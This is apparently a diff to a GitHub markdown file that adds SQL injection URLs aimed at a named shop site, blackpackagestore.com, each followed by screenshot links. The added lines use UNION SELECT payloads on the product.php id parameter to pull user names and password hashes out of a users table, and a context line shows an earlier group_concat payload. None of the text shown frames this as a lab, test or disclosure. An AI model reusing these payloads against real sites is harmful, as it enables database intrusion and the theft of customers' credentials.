@@ -36,5 +36,27 @@ https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(
 
 ![image](https://github.com/user-attachments/assets/56202ebd-5494-4202-902c-8bcce97b7699)
 
+https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users
 
+![image](https://github.com/user-attachments/assets/ae785d98-fb82-48b3-b93f-2db8573a8b2b)
+
+https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password_hash,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users
+
+![image](https://github.com/user-attachments/assets/21f2d6bf-6f0e-40b0-a00e-1d82d634f08e)
+
+![image](https://github.com/user-attachments/assets/c5c25908-7213-447b-8c11-74e926545840)
+
+![image](https://github.com/user-attachments/assets/2127b404-259e-417a-94e4-722aec4c55b3)
+
+![image](https://github.com/user-attachments/assets/d9f17e4d-25ef-4890-ac4a-bf44a344b327)
+
+![image](https://github.com/user-attachments/assets/fe22e570-f0ce-463b-a7e3-ea2bc8165b7f)
+
+![image](https://github.com/user-attachments/assets/52a6f9ab-eb0d-4a26-9dcb-f3b508b81e3b)
+
+![image](https://github.com/user-attachments/assets/2054d2a2-1b16-4880-a56e-c776fda75c70)
+
+![image](https://github.com/user-attachments/assets/0709a901-ee5c-47ef-95ad-a21e66f6de02)
+
+![image](https://github.com/user-attachments/assets/394ed735-6352-49a4-b918-61cc6fab1593)
 
